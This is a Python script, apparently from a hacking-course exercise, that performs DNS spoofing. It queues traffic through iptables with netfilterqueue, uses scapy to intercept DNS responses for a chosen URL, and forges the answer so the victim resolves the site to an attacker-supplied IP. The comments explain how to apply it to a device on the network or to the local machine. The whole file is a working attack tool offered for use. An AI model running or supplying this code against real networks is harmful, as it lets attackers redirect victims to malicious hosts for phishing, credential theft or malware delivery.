#!/usr/bin/env python

# sudo iptables -I FORWARD --jump NFQUEUE --queue-num 0 //to try on a diff device

# sudo iptables -I INPUT --jump NFQUEUE --queue-num 0 //to try on local device
# sudo iptables -I OUTPUT --jump NFQUEUE --queue-num 0

# requires netfilterqueue , not available for python 3.7+ via pip,
# install from source
# https://github.com/kti/python-netfilterqueue

# git clone git@github.com:kti/python-netfilterqueue.git
# cd python-netfilterqueue
# python setup.py install

import netfilterqueue
import scapy.all as scapy
import argparse


def process_packet(packet):
    print(packet)
    print(packet.get_payload())  # needs to be converted to a scapy packet

    scapy_packet = scapy.IP(packet.get_payload())  # wraps the packet into IP layer
    if scapy_packet.haslayer(scapy.DNSRR):  # check packet fields list => DNSRR stands for dns response record
        qname = scapy_packet[scapy.DNSRR].qname # syntax => var[module.field].subfield

        if url in qname:

            answer = scapy.DNSRR(rrname=qname, rdata=attacker_ip)  # creates a DNSRR response to be send to the
            # target machine
            scapy_packet[scapy.DNS].an = answer  # sets payload to forged package
            scapy_packet[scapy.DNS].ancount = 1  # check pcks sent and match num with correct value

            # deletes the fields chksum and len outta each layer, scapy will recalculate them
            # without it it wont work
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))  # modifies original package with forged one

        # print(scapy_packet.show())

    # packet.drop()  # choose what to do and uncomment
    packet.accept()  # choose what to do and uncomment


def get_arguments():
    parser = argparse.ArgumentParser(description='Introduce attack options')
    parser.add_argument('-u', '--url', dest='url', help='URL to mock \n => E.G www.some_site.com')
    parser.add_argument('--ip', dest='attacker_ip', help='Wanted destination\'s IP')
    options = parser.parse_args()
    if not options.url:
        parser.error("[*] Introduce URL")
    elif not options.attacker_ip:
        parser.error("[*] Introduce ATTACKER IP")
    return options


parsed_options = get_arguments()

url = parsed_options.url
attacker_ip = parsed_options.attacker_ip


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # 0 STANDS FOR THE QUEUE NUMBER
queue.run()